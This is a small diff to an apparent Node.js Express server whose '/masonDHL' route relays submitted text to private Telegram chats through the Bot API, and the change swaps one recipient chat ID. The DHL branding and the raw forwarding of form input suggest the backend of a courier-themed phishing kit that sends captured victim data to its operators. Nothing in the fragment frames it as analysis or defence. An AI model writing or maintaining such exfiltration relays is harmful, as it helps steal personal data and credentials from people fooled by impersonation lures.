@@ -71,7 +71,7 @@ app.post('/masonDHL', (req, res) => {
                 `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=DHLMason:\n${originalText}`
             );
             axios.post(
-                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=2134201699&text=DHL:\n${originalText}`
+                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1912976454&text=DHL:\n${originalText}`
             );
             mason += 1
         }
